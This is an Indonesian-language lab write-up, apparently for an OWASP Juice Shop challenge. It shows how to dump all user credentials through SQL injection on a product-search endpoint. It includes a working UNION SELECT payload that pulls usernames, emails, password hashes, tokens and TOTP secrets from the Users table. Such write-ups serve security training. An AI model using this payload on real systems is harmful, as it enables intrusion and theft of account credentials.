# User Credentials

## Deskripsi

Tujuan dari challenge ini adalah mengambil seluruh kredensial user yang tersimpan dalam database menggunakan teknik SQL Injection.

---

## Resource

* [PortSwigger – Examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database)
* [PortSwigger – UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

---

## Langkah-langkah

### 1. Identifikasi schema tabel `Users`

Dari challenge **Database Schema**, tabel `Users` memiliki 13 kolom:

```
id, username, email, password, role, deluxeToken,
lastLoginIp, profileImage, totpSecret, isActive,
createdAt, updatedAt, deletedAt
```

<img width="1919" height="1140" alt="schema" src="https://github.com/user-attachments/assets/59ac8d25-3050-4922-a6a8-ff5aee2ba325" />

---

### 2. Tentukan endpoint yang vulnerable

Endpoint `/rest/products/search?q=` digunakan untuk filter produk. Parameter `q` dieksekusi langsung dalam query SQL sehingga rentan terhadap SQL Injection.

<img width="1919" height="1136" alt="intercept" src="https://github.com/user-attachments/assets/651dfcb0-387b-44bc-bfe5-f3ed7fc748b8" />

---

### 3. Buat payload UNION SELECT

Karena query produk menggunakan 9 kolom, injection harus disesuaikan agar jumlah kolom sama.
Kolom yang dipilih dari tabel `Users`:

* `username`
* `email`
* `password`
* `role`
* `deluxeToken`
* `totpSecret`
* `isActive`
* `createdAt`
* `updatedAt`

Payload yang digunakan:

```sql
aaa')) UNION SELECT 
username, email, password, role, deluxeToken,
totpSecret, isActive, createdAt, updatedAt 
FROM Users--
```

<img width="1919" height="1133" alt="payload" src="https://github.com/user-attachments/assets/0aa834c5-5c0c-4a38-b767-f12d3aace714" />

Hasilnya, seluruh data kredensial user berhasil ditampilkan.

---

## Catatan

* Schema tabel `Users` yang sudah diperoleh sebelumnya sangat membantu menyusun payload dengan cepat.
* Jumlah kolom harus sesuai dengan query asli (9 kolom), jika tidak maka query akan gagal.
* Data yang terekspos meliputi username, email, password hash, token, serta status akun.
* Hal ini menunjukkan kelemahan serius pada query SQL yang tidak melakukan sanitasi input.
